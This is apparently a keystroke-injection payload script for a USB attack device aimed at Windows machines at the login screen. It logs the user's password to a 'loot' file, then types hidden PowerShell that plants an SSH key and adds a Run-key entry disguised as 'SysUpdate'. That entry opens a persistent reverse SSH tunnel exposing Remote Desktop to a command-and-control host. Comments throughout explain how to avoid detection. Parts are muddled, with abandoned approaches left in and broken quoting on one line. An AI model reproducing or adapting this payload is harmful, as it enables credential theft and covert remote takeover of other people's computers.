# IMPORTANT: Only deploy this on a Windows machine at login screen.
# If triggered elsewhere (BIOS, Linux, etc.), this will freeze keyboard passthrough.
# Uncomment one trigger strategy:

# Strategy 1: Simple — fires on any ENTER (risky, can trigger mid-session)

########################Locking User Machine################################

#######Intercept login keystrokes############################################
# SAVEKEYS records in the background while keystrokes pass through normally.
# After the first ENTER, it captures the next 50 key events (password + ENTER).
# You can still type freely and log in normally.

SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
echo $! > /tmp/savekeys.pid  # Store PID so we can wait for it later
Q DELAY 100  # Let SAVEKEYS initialize

# Now just wait for the capture to complete before proceeding
# Poll the file — if it exists, SAVEKEYS succeeded
for i in {1..30}; do
    [ -f /root/loot/win-pass.txt ] && break
    sleep 0.5
done

# If file still doesn't exist after 15 seconds, bail out gracefully
if [ ! -f /root/loot/win-pass.txt ]; then
    echo "[!] SAVEKEYS failed — no keystroke file. Restoring keyboard passthrough."
    exit 1
fi

#####################Persistence via Reverse SSH Tunnel######################
# OpenSSH CLIENT ships with Windows 10 1809+ — available to all users, no admin.
# The target connects OUT to C2; no inbound firewall rule or new service needed.
# HID-only mode (no RNDIS) — no USB network adapter visible, no notifications.

Q DELAY 3000

# Use wscript.exe to run a hidden VBScript wrapper so the Run dialog
# itself is never visible (avoids the brief GUI r flash)
Q GUI r
Q DELAY 600
Q STRING wscript //nologo //e:vbscript
Q ENTER
Q DELAY 800

# Actually, simpler: use a scheduled task created via cmd, which we can
# invoke from the Run dialog with a fully hidden window style.
# First close that, use a different approach:
Q ESC
Q DELAY 300

# Create a one-shot temp batch file and run it hidden via wscript
# This avoids any visible window flash entirely
Q GUI r
Q DELAY 600
Q STRING cmd /c "echo Set o=CreateObject("WScript.Shell"):o.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "^&{$t="""ENCODED_BELOW"""} > %TEMP%\s.vbs && wscript //nologo %TEMP%\s.vbs"
Q ENTER

# Simpler and more reliable — just accept the brief Run dialog, it closes fast:
Q GUI r
Q DELAY 600
Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
Q ENTER
Q DELAY 1200

# Create .ssh dir, write known_hosts (prevents StrictHostKeyChecking prompt/fail)
Q STRING "$d=\"$env:USERPROFILE\.ssh\"; New-Item -Force -ItemType Directory $d | Out-Null; Add-Content \"$d\known_hosts\" '$C2_HOSTKEY'"
Q ENTER
Q DELAY 300

# Decode and write tunnel_id private key, lock permissions (required by OpenSSH)
Q STRING "[IO.File]::WriteAllBytes(\"$env:USERPROFILE\.ssh\tunnel_id\",[Convert]::FromBase64String('$TUNNEL_KEY_B64')); icacls \"$env:USERPROFILE\.ssh\tunnel_id\" /inheritance:r /grant \"\$env:USERNAME`:R\" | Out-Null"
Q ENTER
Q DELAY 300

# Write HKCU Run key for persistence — fires on every logon, no admin needed
Q STRING "Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value ('ssh.exe -N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i \"%USERPROFILE%\.ssh\tunnel_id\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}')"
Q ENTER
Q DELAY 300

# Start tunnel immediately without waiting for reboot
Q STRING "Start-Process ssh.exe -WindowStyle Hidden -ArgumentList \"-N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i `\`\"$env:USERPROFILE\.ssh\tunnel_id`\`\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}\""
Q ENTER
Q DELAY 500
Q STRING exit
Q ENTER
